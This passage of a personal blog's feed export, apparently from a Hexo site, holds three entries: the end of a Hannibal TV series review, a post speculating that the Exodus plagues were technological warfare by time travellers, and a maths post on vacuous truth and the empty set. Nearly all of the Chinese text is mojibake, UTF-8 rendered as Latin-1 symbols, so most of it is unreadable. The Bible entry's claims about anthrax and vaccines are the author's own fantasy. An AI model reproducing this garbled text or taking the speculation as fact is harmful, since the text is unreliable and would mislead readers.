·å¤§å®¶éƒ½ä¸ç”¨æ­»ï¼Œè€Œä¸”ä»–ä¹Ÿå¯ä»¥æ—¶å¸¸å»æ¢æœ›Hannibaläº¤æµã€‚Hannibalä¾ç„¶å¾ˆä¼¤å¿ƒï¼Œå³ä¾¿Willçœ‹åˆ°äº†Abigalæ´»ç€çš„äº‹å®ï¼ŒWillä¾ç„¶ä¸åæ‚”è‡ªå·±é€‰æ‹©æŠ“Hannibalè€Œéè·Ÿä»–èµ°ã€‚å¤©ä¸Šçš„é›¨ä¸€ç›´ä¸‹ç€ï¼ŒHannibalç”¨åˆ€å‰²ä¼¤äº†Hannibalå’ŒAbigalï¼Œå†’ç€é›¨å¤œé€ƒç¦»ï¼Œå¾’ç•™äº†æ»¡å±‹å­é‡ä¼¤çš„ä¸€è¡Œäººã€‚</p><p>ç¬¬äºŒå­£ï¼ŒHannibalä½œä¸ºå°‘æ•°çš„å—œæ€æœ¬èƒ½çš„æ€äººé­”ï¼Œä½œä¸ºè§‚ä¼—æ„Ÿå—å¾—åˆ°Hannibalèƒ½è¢«ç†è§£çš„æ½œåŠ›ï¼šå¦‚Willã€‚Hannibalå†…å¿ƒæ¸´æœ›èƒ½å’Œè‡ªå·±å¦è¯šäº¤æµçš„äººï¼Œèƒ½å’Œè‡ªå·±ä¸€èµ·åˆ†æå…¶ä»–ç½ªçŠ¯è¿›è¡Œä¾§å†™çš„æœ‹å‹ï¼Œè€ŒéåƒAlanaé‚£æ ·çœ‹èµ·æ¥åœ¨äº²å¯†å…³ç³»ä½†æ˜¯æ—¶æ—¶åˆ»åˆ»éƒ½åœ¨éšç’å’Œæ¬ºéª—çš„äººã€‚ä»–é„™è§†Jackçš„æ€¥åŠŸè¿‘åˆ©è€Œæ‹–Willè¶Ÿæµ‘æ°´ï¼Œé„™è§†Jackçš„å¼ºåŠ¿å´æ²¡æœ‰æ·±åˆ»çš„æ€è€ƒèƒ½åŠ›ï¼Œä»–ä¼šç”¨å¾ˆæ–‡è‰ºã€æƒŠæ‚šçš„æ‰‹æ³•å»æ€æ‰Jackèº«è¾¹çš„äººæ¥ä¾®è¾±ï¼Œæ‰“ç”µè¯æŠ˜ç£¨Jackã€‚Hannibalæœ‰ç€æµ“åšçš„æ¶è¶£å‘³ï¼Œä»–å–œæ¬¢è°ƒæˆJackè¿™ç§å¿ƒç†å¼ºå¤§ä½†æ˜¯æ€è€ƒèƒ½åŠ›ç©ºæ´çš„å¯¹æ‰‹ï¼Œè¿™ç§å¯¹æ‰‹å¾ˆç¨€æœ‰ï¼Œå› æ­¤ä»–ä¸ä¼šç›´æ¥æ€æ‰Jackã€Willè¿™æ ·ä¸ºæ•°ä¸å¤šèƒ½åšæŒºçš„äººç±»ã€‚Hannibalæ˜¯å­¤é«˜çš„ï¼Œä»–æ²¡æœ‰æœ‹å‹ï¼Œå› æ­¤ä»–æ¸´æœ›é€šè¿‡æç«¯çš„å¿ƒç†å­¦å’ŒåŒ»å­¦æ‰‹æ®µåˆºæ¿€Willèƒ½æˆä¸ºä»–çš„åŒç±»ï¼Œä»–ä¹Ÿæ²¡æœ‰åŠæ³•å¸ä¸‹é¢å…·å»å’ŒAlanaäº¤æµã€‚ä¸€åˆ‡éƒ½è¦ç²¾ç»†è®¡ç®—ï¼Œä¸€åˆ‡éƒ½åœ¨ä»–çš„æŒæ§ï¼Œå´åˆé‚£ä¹ˆæ— èŠã€‚ä»–ä¼ªè£…ä»–çš„çŸ¥è¯†å‚¨é‡ã€é«˜æ™ºå•†å’Œå—œæ€çš„æœ¬æ€§ï¼Œä»ä¸€æ­¥ä»¥æ–½èˆçš„å§¿æ€æŠ›ç»™FBIä»¬æµ…æ˜¾çš„çº¿ç´¢ä¸ºä¹ã€‚</p><p>å¾ˆéš¾æƒ³è±¡ï¼Œé›¨å¤œä¸­æµ‘èº«æ˜¯è¡€çš„Hannibalï¼Œæ˜¯å¤šä¹ˆçš„å¤±æœ›ã€å¤±è½ã€å­¤ç‹¬ï¼Œä»–æŠŠæ‰€æœ‰ç ”ç©¶èµ„æ–™éƒ½çƒ§äº†ï¼Œæ‰€æœ‰å»ºç«‹çš„ç¤¾äº¤äººç‰©éƒ½è¢«ä»–é‡ä¼¤äº†ï¼Œä»–æ½œä¼äº†æ•°å¹´å´ä¸€æ— æ‰€æœ‰ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰å¸¦èµ°ã€‚</p><p>ç¬¬ä¸‰å­£ï¼ŒHannibalé€ƒåˆ°äº†æ„å¤§åˆ©ä½›ç½—ä¼¦è¨ã€‚Hannibalè‡ªå¹¼ä¾¿åœ¨è¿™é‡Œé•¿å¤§ï¼Œä»–å›åˆ°äº†æ•…ä¹¡ï¼Œä»–äº†è§£Danteï¼Œå¯¹Divine Comedyæœ‰æ·±åšçš„ç†è§£ã€‚åˆå§‹é˜µè¥è¢«é‡æ–°åˆ’åˆ†ä¸ºä¸‰æ´¾ï¼šWillã€Jackå’ŒMasonï¼ˆMason Vergerï¼‰ä¹Ÿè¿½åˆ°ä½›ç½—ä¼¦è¨å¤ä»‡ã€‚ç»è¿‡è§’é€ï¼ŒHannibalæƒ³åƒæ‰Willæ—¶ï¼Œä»–ä¿©éƒ½è¢«MasonæŠ“èµ·æ¥é€å›äº†ç¾å›½ã€‚Masonå› æ‰§å¿µï¼Œæ¸´æœ›Willçš„é¢å­”æ¥æ•´å®¹ï¼Œä½†æ˜¯è¿™è§¦æ€’äº†Hannibalå’ŒAlanaï¼Œçœ¼ä¸‹Alanaåªèƒ½å¯„å¸Œæœ›äºHannibalæ‹¯æ•‘Willã€‚æœ€ç»ˆï¼Œæœ¬æœºçš„ç¬¬ä¸€ä¸ªå†³æˆ˜ï¼ŒAlanaè§£æ•‘äº†Hannibalï¼ŒHannibalè§£æ•‘äº†Willï¼ŒHannibalå¸¦Willå»äº†ä¸€ä¸ªéšç§˜å¤„ç–—ä¼¤ã€‚ä½†æ˜¯Willæ­¤æ—¶å·²å¯¹Hannibalçš„ä¿¡èµ–å’Œæ€€ç–‘å·²æ„Ÿåˆ°ç–²æƒ«ï¼ŒHannibalæ— å¥ˆæ­£å¼è¢«æ•ï¼Œé”’é“›å…¥ç‹±ã€‚</p><p>æ—¶é—´è¿‡äº†å¾ˆä¹…ï¼ŒWillå¨¶äº†å¦»å­Mollyï¼ŒMollyæœ‰ä¸€ä¸ªå°å­©ã€‚Jackæ­¤æ—¶æƒ³è¿½æŸ¥Francisï¼ˆNamely also: Tooth fairy, Red dragonï¼‰çš„çº¿ç´¢ï¼Œè¯·æ±‚Willå‡ºå±±ã€‚Willå¯Ÿè§‰åˆ°Hannibalä¸Franciså­˜åœ¨è”ç»œçº¿ç´¢å’Œå¿ƒç†æ²»ç–—ã€‚éšåï¼Œç”±äºçº¢é¾™çš„æ„ˆå‘æ®‹å¿ï¼Œä»–å‡ ä¹ä»…ä»…ç”±äºå¥‡å°”é¡¿åŒ»ç”ŸæŠ•æœºå–å·§å¼çš„æé€ ç•…é”€ä¹¦å¤§å‘æ¨ªè´¢ï¼Œå°±ä½¿å¾—å¥‡å°”é¡¿åŒ»ç”Ÿå·®ç‚¹æ­»äº¡ã€‚FBIå†³å®šåˆ©ç”¨Willå’ŒHannibalå¼•è¯±çº¢é¾™å‡ºç°ã€‚çº¢é¾™æˆ˜åŠ›å¼ºå¤§ï¼Œç›´æ¥åŠ«èµ°Hannibalå’ŒWillã€‚æœ€ç»ˆï¼Œçº¢é¾™å› ä¸ºè¦æ¯ä¸ªæœˆæ€æ‰ä¸€å®¶äººï¼Œä»–æƒ³æ€æ‰Willå’ŒHannibalï¼ŒåŒæ—¶Hannibalç›´æ¥ç‚¹æ˜äº†çº¢é¾™å¯¹å¹»æƒ³çš„æ‰§ç€ã€ä¸­äºŒï¼Œåˆºæ¿€äº†çº¢é¾™æœˆå…‰ä¸‹çš„å—œè¡€ï¼Œéšåæœ¬å­£ç¬¬äºŒæ¬¡å†³æˆ˜ï¼Œhannibalå’ŒWillåˆåŠ›åˆ€æ€æ‰äº†çº¢é¾™ï¼Œè¿™ä½¿å¾—Willå†ä¸€æ¬¡å›å½’ç¬¬ä¸€å­£å¼€å¹•å°„æ€Abigalçˆ¶äº²é‚£æ ·ï¼Œå›å‘³äº†å—œæ€çš„å¿«æ„Ÿã€‚çº¢é¾™å’ŒWillçš„è¡€æ¶²åœ¨æœˆå…‰ä¸‹ï¼Œé£æº…å‡ºé»‘è‰²çš„æ¼‚äº®å¼§çº¿ã€‚Willé‡ä¼¤ï¼Œæ‘¸ç€å…¨èº«åˆ€ç—•ç´¯ç´¯çš„èº«ä½“ï¼Œå€’åœ¨Hannibalçš„æ€€ä¸­ã€‚ä¸¤äººå¤œè‰²ä¸‹ç´§ç´§ç›¸æ‹¥ï¼ŒWillæŠ±ç€Hannibalä¸€åŒå å…¥æµ·ä¸­ï¼Œä»¿ä½›åœ¨è¯´â€œæˆ‘å’Œä½ èµ°â€ï¼Œå¥½ä¼¼ç¬¬äºŒå­£Willæœ¬å¯ä»¥æœ‰çš„å’ŒHannibalä¸€èµ·èµ°çš„å¦ä¸€ä¸ªåˆ†æ”¯æƒ…æ™¯ï¼›å´ä¹Ÿåœ¨è¯´â€œæˆ‘ç­”åº”å’Œä½ ä¸€èµ·èµ°ï¼Œæˆ‘å´ä¾ç„¶æ— æ³•å¿˜è®°æˆ‘çš„æœ¬å¿ƒï¼Œä¸€åŒå å…¥æ·±æ¸Šï¼Œè¿™æ˜¯ä½ è®©æˆ‘å’Œä½ èµ°çš„ä»£ä»·â€ã€‚</p><p>ä»è§‚å½±è§’åº¦çœ‹ï¼Œä½œä¸ºç›®å‰æš‚æ—¶çš„æœ€åä¸€å­£ï¼Œæˆ‘ä¸ªäººæ„Ÿè§‰ï¼Œçº¢é¾™ç¯‡ç•¥æœ‰ç”»è›‡æ·»è¶³ï¼Œå¼•å…¥å¹¶æ·±åº¦åˆ»ç”»äº†ä¸€ä¸ªå…·æœ‰å¼ºå¤§æˆ˜åŠ›çš„ç²¾ç¥åˆ†è£‚æ€äººé­”ï¼Œä½†æ˜¯äººç‰©åˆ»ç”»è¿‡äºä¸­äºŒå¹¼ç¨šï¼Œå®åœ¨è®©äººæ— æ³•ä½“ä¼šæ±‰å°¼æ‹”ä¸€ç³»åˆ—ç–¯ç‹‚æ€äººé­”çš„æ–‡è‰ºæƒŠæ‚šé£æ ¼ï¼Œæ•…æ˜¾çªå…€ã€‚</p><p>çº¢é¾™ç¯‡çš„ä½œç”¨ç›¸å¯¹æœ‰é™ï¼š</p><ol><li>å‘¼åº”æ±‰å°¼æ‹”ä¸‰éƒ¨æ›²çš„ç”µå½±ã€Šçº¢é¾™ã€‹</li><li>è¡¨ç°æ±‰å°¼æ‹”å…¥ç‹±åä¾ç„¶æ¸¸åˆƒæœ‰ä½™çš„èƒ½åŠ›</li><li>è¡¨ç°Willå³ä¾¿èº«è´Ÿé‡ä¼¤ï¼Œè¢«Hannibalè§£æ•‘ï¼Œä½†æ˜¯ä¾ç„¶ä¿æŒåˆå¿ƒæŠ“æ•Hannibalçš„æœ¬æ€§ï¼Œä¸”èƒ½å’Œç›‘ç‹±çŠ¶æ€ä¸‹çš„Hannibaläº¤æµã€‚è‹¥æ²¡æœ‰çº¢é¾™ç¯‡ï¼Œæœ¬æœºåœ¨Hannibalå…¥ç‹±åå°±å‰§ç»ˆï¼Œæ²¡æœ‰æœºä¼šå±•ç°Hannibalå’ŒWillåœ¨ç›‘ç‹±ä¸­äº¤æµçš„åœºæ™¯ï¼Œçº¢é¾™åˆšå¥½å¯ä»¥æˆä¸ºWillå©šåä¸¤è€…å†è§çš„ä¸€ä¸ªå¼•å­ã€‚è¿™æ˜¯æˆ‘è®¤ä¸ºç¼–å‰§å¼•å…¥çº¢é¾™ç¯‡çš„æœ€å¤§åŸå› ï¼Œæƒ³å±•ç¤ºHannibalå¦‚ä½•è¶Šç‹±ã€‚</li></ol><p>ä¸ªäººè®¤ä¸ºï¼Œå…¶å®åœ¨Masoné‚£é‡Œå†³æˆ˜ç»“æŸæ›´ä¼šåˆé€‚äº›ï¼šæ¯”å¦‚ï¼ŒHannibalå¯Ÿè§‰çš„WillæŠ¥è­¦ï¼Œå› æ­¤å¼€å§‹å­¤èº«é€ƒäº¡ï¼ŒWillæ‹–ç€é‡ä¼¤çš„èº«ä½“å…ˆFBIä¸€æ­¥æ‰¾åˆ°Hannibalï¼Œä¼šäºæ‚¬å´–è¾¹ï¼Œé»‘å¤œï¼ŒWillå’ŒHannibalç´§ç´§ç›¸æ‹¥ï¼Œä¸€åŒå å…¥æ·±æ¸Šã€‚çœç•¥â€œè¶Šç‹±â€åœºæ™¯ï¼Œä½•å°ä¸ç»´æŠ¤äº†Hannibalçš„å½¢è±¡å’Œè§‚å½±ä½“éªŒã€‚</p><p>ä¸»è§’å›¢ä¸€åªæ‰‹å°±æ•°çš„è¿‡æ¥ï¼Œä½†æ˜¯å¿ƒç†åˆ»ç”»å’Œè¡Œä¸ºå´å€¼å¾—äººæ…¢æ…¢å“å‘³ï¼›é“ºå«æ˜¯æ¼«é•¿çš„ï¼Œä½†ç»éå†—é•¿ï¼Œä½†å´ä½¿å¾—äºå¾ˆå¤šäººæ— æ³•æ…¢æ…¢å“å‘³ã€‚è¿™æ˜¯å……æ»¡è¡€è…¥å’Œè¯¡å¼‚çš„æ–‡è‰ºç‰‡ï¼Œå´æœ‰è¡€æ¶²é£æº…çš„ç¾æ„Ÿï¼›æœˆå…‰ä¸‹ï¼Œé»‘è‰²å’Œçº¢è‰²çš„è¡€æ¶²äº¤ç»‡ï¼Œå¾ˆéš¾ä¸è¯´ä»–ä¸ç¾ä¸½ï¼Œä»¤äººé™¶é†‰å’Œä¸Šç˜¾ï¼›Hannibalå’ŒWillçš„è¾—è½¬åä¾§ï¼Œéšæ™¦ã€æ·±æ²‰çš„æ•é£Ÿè€…ä¸å°ç™½å…”ï¼Œå¤¹æ‚äº†é“ä¸æ˜çš„å‹æƒ…ä¸çˆ±æƒ…ï¼Œæ²‰æµ¸ä½“éªŒå´æ— æ³•è‡ªæ‹”ã€‚</p><p>æœ€åæ±‰å°¼æ‹”è‚¯å®šæ˜¯å’ŒWillåœ¨æ€çº¢é¾™å‰ï¼Œå»äº†å¥³åŒ»ç”Ÿå®¶é‡ŒæŠŠå¥¹çš„è…¿å¸ä¸‹æ¥åšäº†é¥­ï¼Œç„¶ååšäº†æ™šå®´ï¼Œå°±ç­‰æ€äº†çº¢é¾™ç„¶åå›å»åƒè…¿ã€‚ä»æœ€åçš„é•œå¤´å¯ä»¥çœ‹å‡ºæ¥ï¼Œå¥³åŒ»ç”Ÿè‡ªå·±æ²¡äº†è…¿ï¼Œä¸å¯èƒ½è‡ªå·±åšé¥­ï¼Œè€Œä¸”é•¿æ¡Œä¸Šæœ‰ä¸°å¯Œçš„é£Ÿç‰©å’Œä¸¤ä¸ªäººçš„ç©ºçš„é¤å…·ã€‚å¨å°”æ¨äº†æ±‰å°¼æ‹”ä¸€èµ·å å…¥æ‚¬å´–ï¼Œä¸æ¸…æ¥šæ˜¯æ€äº†çº¢é¾™å‰è¿˜æ˜¯åï¼Œå»çš„å¥³åŒ»ç”Ÿå®¶é‡Œã€‚ä½†æ˜¯è‚¯å®šæ˜¯ä¸¤ä¸ªäººä¸€èµ·åšçš„é¥­ï¼Œæ¦‚ç‡å¾ˆå¤§ï¼Œå› ä¸ºæ±‰å°¼æ‹”ä»è¢«åŠ«ç‹±åä¸€ç›´å’Œå¨å°”åœ¨ä¸€èµ·ï¼Œä¸¤äººåœ¨å»æ€çº¢é¾™ä¹‹å‰ï¼Œæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç©ºæ¡£æœŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bible fantasy</title>
      <link href="/2024/09/28/trivia/bible/"/>
      <url>/2024/09/28/trivia/bible/</url>
      
        <content type="html"><![CDATA[<p>2024å¹´9æœˆ28æ—¥ï¼Œå»äº†æ•™ä¼šç¤¾å›¢ï¼Œå­¦ä¹ äº†Bibleä¸­ã€Šå‡ºåŸƒåŠè®°ã€‹ç›¸å…³å†…å®¹ï¼Œå¤§æ„æ˜¯æ‘©è¥¿åˆšå‡ºç”Ÿæ—¶å› ä¸ºä¿Šç¾æ²¡æœ‰è¢«æ€æ‰ï¼Œéšåæ¼‚æµåˆ°æ³•è€å¥³å„¿å±…å¤„å› ä¸ºæ€œæ‚¯ï¼Œè€Œå¹¸è¿çš„ç”Ÿå­˜äº†ä¸‹æ¥ã€‚æ‘©è¥¿èƒŒè´Ÿç€ç¥çš„ä½¿å‘½ï¼Œå¸¦é¢†ä»¥è‰²åˆ—äººä»åŸƒåŠæ³•è€çš„å¥´å½¹ä¹‹ä¸‹å¼€å§‹å‡ºé€ƒã€‚</p><p>æˆ‘çš„åˆ†æé‡ç‚¹åœ¨ã€Šå‡ºåŸƒåŠè®°ã€‹7:1-13ï¼Œæ­¤å¤„æˆ‘åªå¯¹æ•…äº‹åšç®€è¦æ¦‚è¿°ï¼Œå¦‚æœæƒ³ç»“åˆåŸæ–‡åˆ†æï¼Œæˆ‘æ¨èè¯»è€…è‡ªè¡Œæœç´¢â€œå‡ºåŸƒåŠè®°ç¬¬ä¸ƒç« â€ï¼Œç›´æ¥çœ‹åˆ°è€¶å’Œåã€æ‘©è¥¿å’Œæ³•è€çš„æƒ…èŠ‚ã€‚</p><ul><li>åœ¨æ³•è€å…è®¸ä»¥è‰²åˆ—äººç¦»å¼€å‰ï¼Œæ³•è€é¢å¯¹å„ç§ä¸å¯¹ç§°çš„å·¨å¤§å¨æ…‘ä¸‹ï¼Œå‡â€œæ³•è€çš„å¿ƒåˆšç¡¬â€ï¼›</li><li>æ‘©è¥¿å’Œæ³•è€çš„åšå£«ã€æœ¯å£«æ–å˜è›‡ï¼Œä½†æ˜¯æ‘©è¥¿çš„è›‡ç›´æ¥åäº†ä»–ä»¬çš„è›‡ï¼Œæ¨æµ‹æ³•è€çš„è›‡æ˜¯çœŸè›‡ï¼Œä½†æ˜¯æ‘©è¥¿çš„è›‡åº”è¯¥ä¸æ˜¯å½“åœ°ç‰©ç§ï¼›</li><li>æ‘©è¥¿å’Œç¥è¿ç»­ä¸ƒå¤©ä¸¥é‡æ±¡æŸ“æ²³æµï¼Œæ¨æµ‹æ˜¯ä¸‹æ¯’ï¼Œç ´åå½“åœ°ç”Ÿæ€ç»“æ„ï¼›</li><li>å¤§æ‰¹é’è›™ç”Ÿç‰©æ”»å‡»ï¼Œéšåé’è›™æ­»å»ï¼Œè…¥è‡­ï¼›</li><li>æ•£æ’­è™±å­ï¼Œå¯„ç”Ÿè™«ï¼Œç”Ÿç‰©æ”»å‡»ï¼›</li><li>è‹è‡æ”»å‡»ï¼›</li><li>ä»¥è‰²åˆ—äººçš„ç‰²ç•œä¸æ­»ï¼ŒåŸƒåŠçš„ç‰²ç•œå…¨æ­»ï¼›</li><li>æ‘©è¥¿åœ¨æ³•è€é¢å‰æ‰¬ç°èµ·ç–®ï¼Œæ‘©è¥¿æ²¡äº‹å„¿ï¼Œå…¶ä»–äººæœ‰äº‹å„¿ï¼Œæ¨æµ‹æ’’çš„æ˜¯ç‚­ç–½èŒä¸€ç±»çš„æ€¥æ€§å¾®ç”Ÿç‰©ï¼Œä½†æ˜¯æ‘©è¥¿æ‰“äº†ç–«è‹—ï¼Œå› æ­¤æ²¡äº‹å„¿ï¼›</li><li>å†°é›¹æ”»å‡»ï¼Œè‡ªç„¶ç¯å¢ƒæ”¹å˜ï¼›</li><li>è—è™«å…¥å¢ƒï¼Œç”Ÿç‰©æ”»å‡»ï¼›</li><li>äººå’Œç‰²ç•œçš„é•¿å­å…¨éƒ¨æ­»äº¡ï¼›</li><li>å¤§æµ·åˆ†å¼€æ·¹æ­»è¿½å…µï¼›</li><li>å…¶ä¸­ä¸€äº›ç¥å’Œæ‘©è¥¿çš„æ–¹æ³•éå¸¸æ¥è¿‘ ç»†èŒæˆ˜ï¼Œç”Ÿç‰©æˆ˜ï¼Œè‡ªç„¶æ°”å€™æ”¹å˜ï¼Œæ²³æµæ±¡æŸ“ï¼Œç¬¦åˆç§‘æŠ€æˆ˜äº‰ç‰¹å¾ã€‚å¤šæ¬¡å‡ºç°â€œæ³•è€å¿ƒåˆšç¡¬â€ï¼Œæœ‰å¼ºè°ƒæ³•è€å¼‚äºå¸¸äººçš„å›ºæ‰§ï¼Œåœ¨å¼ºçƒˆæš—å–»çœŸæ³•è€è¢«æ€ï¼Œé‚£æ˜¯ä¸ªé…åˆç¥å¤§æ–½ç¥å¨çš„æœºå™¨äººã€‚ä»¥å½“æ—¶çš„æ”¿æ²»èƒŒæ™¯ï¼Œç¥éœ€è¦æ€é¸¡å„†çŒ´å¼åœ°æ–½å±•ç¥å¨ï¼Œå› æ­¤éœ€è¦æ³•è€æåº¦å›ºæ‰§ï¼Œç¥æ‰æœ‰å±•ç¤ºéœ‡æ…‘å¨åŠ›çš„æœºä¼šã€‚</li></ul><p>â€œç¥â€æœ‰å¯èƒ½æ˜¯å¤§çº¦ä¸€åƒå¹´åçš„ç§‘æŠ€æ°´å¹³çš„ä»¥è‰²åˆ—åä»£ï¼Œç©¿è¶Šæ—¶é—´åˆ°è¿‡å»ã€‚è¿™ç§ç©¿è¶Šåº”è¯¥å­˜åœ¨ä»€ä¹ˆé™åˆ¶ï¼Œç¥æ— æ³•æ— æ—¶æ— åˆ»å¬åˆ°è¿™ä¸ªç§æ—çš„å‘¼å”¤ï¼Œä¹Ÿæ— æ³•æ— æ—¶æ— åˆ»å‡ºæ‰‹å¸®åŠ©ã€‚åœ£ç»æ®æˆ‘æ¨æµ‹ï¼Œæ˜¯ä»¥ä¸¤åƒå¹´å‰äººçš„è§†è§’è®°å½•çš„ç¥è¿¹ï¼Œæˆ‘å€¾å‘äºæ•…äº‹æœ¬èº«æ˜¯çœŸå®å‘ç”Ÿè¿‡çš„ï¼Œå€¼å¾—æ¢å¯»ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vacuous_truth</title>
      <link href="/2024/09/27/Math/vacuous-truth/"/>
      <url>/2024/09/27/Math/vacuous-truth/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”±ç©ºé›†å’Œå­é›†ï¼Œæƒ³åˆ°ç©ºæ´çœŸç†"><a href="#ç”±ç©ºé›†å’Œå­é›†ï¼Œæƒ³åˆ°ç©ºæ´çœŸç†" class="headerlink" title="ç”±ç©ºé›†å’Œå­é›†ï¼Œæƒ³åˆ°ç©ºæ´çœŸç†"></a>ç”±ç©ºé›†å’Œå­é›†ï¼Œæƒ³åˆ°ç©ºæ´çœŸç†</h1><p>æœ€å¼€å§‹æ˜¯å› ä¸ºæˆ‘ä¸ŠPaulçš„lectureï¼Œä»–åœ¨è®²Relationçš„æ•°å­¦çŸ¥è¯†ï¼Œé—®åˆ°â€œCould one have a releation of itself?â€ï¼Œæˆ‘åœ¨å°ä¸‹æƒ³åˆ°é€’å½’çš„æ¦‚å¿µï¼Œä»¥åŠç©ºé›†çš„æ¦‚å¿µï¼Œé‚ç­”â€œRecursion! For example, an empty set is a subset of the empty set itself.â€å½“æ—¶Paulä¸‹å°å’Œæˆ‘èŠäº†ä¸€ä¸‹ï¼Œå¯èƒ½ä¸€ä¸‹å­æ²¡æœ‰ååº”è¿‡æ¥â€œç©ºé›†æ˜¯ä¸æ˜¯ç©ºé›†çš„å­é›†â€çš„æ¦‚å¿µï¼Œé‚ä½œç½¢ã€‚</p><p>æˆ‘å½“æ—¶çªç„¶ä¹Ÿåœ¨é—®æˆ‘è‡ªå·±ï¼Œâ€œç©ºé›†æ˜¯ç©ºé›†è‡ªå·±çš„å­é›†â€æ˜¯trueè¿˜æ˜¯falseã€‚ä¸€å¼€å§‹ä½¿ç”¨ChatGPTæŸ¥äº†ä¸€ä¸‹ï¼Œæˆ‘åˆ†åˆ«ç”¨Englishå’ŒChineseæŸ¥è¿™ä¸ªstatementæ˜¯trueè¿˜æ˜¯falseï¼Œä½†æ˜¯åˆ†åˆ«å¾—åˆ°äº†â€œTrueâ€å’Œâ€œFalseâ€çš„å›ç­”ï¼Œæˆ‘ç–‘æƒ‘ï¼Œå‘Ed Forumä¸Šå¯»tutorså¸®åŠ©ã€‚</p><p>æ­¤å¤„æˆ‘æŠŠå…³é”®éƒ¨åˆ†ä»¥textå½¢å¼åœ¨æ­¤å¤„ç®€è¿°æˆ–å¤åˆ¶ï¼š</p><p>â€œç©ºé›†æ˜¯ç©ºé›†çš„å­é›†â€ä¸å¥½åˆ¤æ–­çš„åŸå› åœ¨äºï¼š</p><ol><li>å­é›†çš„å®šä¹‰æ˜¯ï¼Œæ‰€æœ‰å…ƒç´ ä¹Ÿåœ¨å¦ä¸€ä¸ªé›†åˆä¸­å‡ºç°ï¼›</li><li>ç©ºé›†æ²¡æœ‰å…ƒç´ ã€‚</li></ol><p>å› æ­¤ï¼Œwikipediaä¸Šå¯¹æ­¤statementçš„æè¿°ï¼š</p><p>The empty set, written âˆ… or {} has no elements, and therefore is vacuously a subset of any set X.</p><p>æ³¨æ„ï¼Œè¿™é‡Œçš„å‰¯è¯<strong>vacuously</strong>(ç©ºæ´åœ°)ï¼Œæœ‰hyperlinkæŒ‡å‘â€œ<strong>vacuous truth</strong>â€ï¼ˆå³æ•°å­¦æ¦‚å¿µâ€œç©ºæ´çš„çœŸç†â€ï¼‰ã€‚</p><p>æˆ‘è‡ªå·±çš„ç†è§£ä¸è®ºè¿°ï¼ˆæ¨èè‹±æ–‡ä¸å¥½çš„åŒå­¦ç›´æ¥æœºç¿»ä¸€ä¸‹ï¼Œæ­¤å¤„â€œç©ºæ´çœŸç†â€æ¦‚å¿µå¾ˆæœ‰è¶£ï¼ï¼‰ï¼š</p><pre><code>Hi tutor Liwenqing Liu,Yeah, what you said is right, it is the only math formula, it can give the number of &#123;&#125;&#39;s subsets, but it cannot prove &#123;&#125; is the subset of &#123;&#125;. It is a B-&gt;A causal relation rather not A-&gt;B relation.I followed Jiapeng Wang&#39;s last reply to understand the vacuous truth, and I sorted out the following steps here.1. &#123;&#125; has no elements2. According to the definition of subsetI cannot prove &#123;&#125; is the subset of &#123;&#125;. Because &#123;&#125; has no element, and &#123;&#125; has no element either. We cannot say that every element of &#123;&#125; belongs to &#123;&#125;.3. there is a paragraph of Vacuous Truth from Wikipedia[Vacuous truth](https://en.wikipedia.org/wiki/Vacuous_truth)It is sometimes said that a statement is vacuously true because it does not really say anything.[2] For example, the statement &quot;all cell phones in the room are turned off&quot; will be true when no cell phones are present in the room. In this case, the statement &quot;all cell phones in the room are turned on&quot; would also be vacuously true, as would the conjunction of the two: &quot;all cell phones in the room are turned on and turned off&quot;, which would otherwise be incoherent and false.I think:&#123;&#125; has the same element of &#123;&#125; ----- Truth3-1. because &#123;&#125; has no element (Empty set&#39;s definition)3-2. neither has no elements =&gt; Both two statements &quot;they have the same elements&quot; and &quot;they have no the same elements&quot; are right. The two statements are both right, but it will be false if combinate them into one statement &quot;they have no the same elements and have the same elements&quot;.So according to Vacuous Truth, it is true that &quot;they have no the same elements&quot; of &#123;&#125; and &#123;&#125;.One more proverb (just for my understanding), if I say &quot;My cat can do backflips at home&quot; to my friend, and then he/she would have a look with me (True). But a normal person knows such a cat who can do backflips doesn&#39;t exist.4. Ok, I don&#39;t how to convince myself of the Vacuous Truth honestly, I am trying to cheat myself. Thank you for seeing this step. I don&#39;t know how to prove &quot;&#123;&#125; is the subset of &#123;&#125;&quot;, it is too hard for me. T_T . I don&#39;t struggle anymore.</code></pre><p>ä¸tutorsè®¨è®ºè¯¦æƒ…å§‹æœ«è¯¦è§å¦‚å›¾æ‰€ç¤ºã€‚</p><p><img src="/2024/09/27/Math/vacuous-truth/COMP9020-â€“-Ed-Discussion.png" alt="COMP9020-â€“-Ed-Discussion"></p><p>å…¶å®æƒ³æƒ³ç©ºæ´çœŸç†ï¼šâ€œç©ºæ´â€è¡¨ç¤ºä½ æ— æ³•ä½¿ç”¨ä¸¥å¯†é€»è¾‘å»è¯æ˜ï¼›â€œçœŸç†â€è¡¨ç¤ºä»–æ˜¯çœŸçš„ï¼Œä½ ç”šè‡³æ— æ³•å¦å®šï¼ˆå¾…ä¼šå„¿æˆ‘å†ä¸¾ä¾‹å­ï¼‰ã€‚åœ¨æ•°å­¦é¢†åŸŸï¼Œç©ºæ´çœŸç†å¸¸å¯ä»¥ç”¨äºæ¢ç´¢æ¨¡ç³Šçš„è¾¹ç•Œé—®é¢˜ï¼Œæ¥ä¿è¯æ•°å­¦é€»è¾‘çš„è¿è´¯å’Œè®¡ç®—é—­åŒ…ï¼Œæ¯”å¦‚0çš„æ¦‚å¿µã€‚</p><p>å¤ä»£äººä»¬æ•°æ•°ï¼Œéƒ½æ˜¯ä»1å¼€å§‹ä½œä¸ºç¬¬ä¸€ä¸ªåºæ•°æˆ–åŸºæ•°è¯ï¼Œæ²¡æœ‰0çš„æ¦‚å¿µã€‚æˆ‘è¯´æˆ‘æœ‰iphoneï¼Œåªä¸è¿‡æ•°é‡ä¸º0ï¼Œè¿™å¥è¯æ•°å­¦å±‚é¢æ˜¯trueè€Œéfalseï¼ˆæ³¨æ„åŒºåˆ†â€œç›´è§‰ä¸Šè®¤ä¸ºæˆ‘æ²¡æœ‰iphoneâ€å’Œæ•°å­¦æ€§è´¨ä¸Šâ€œæˆ‘æœ‰iphoneâ€çš„åŒºåˆ«ï¼‰ã€‚äººä»¬åšåŠ 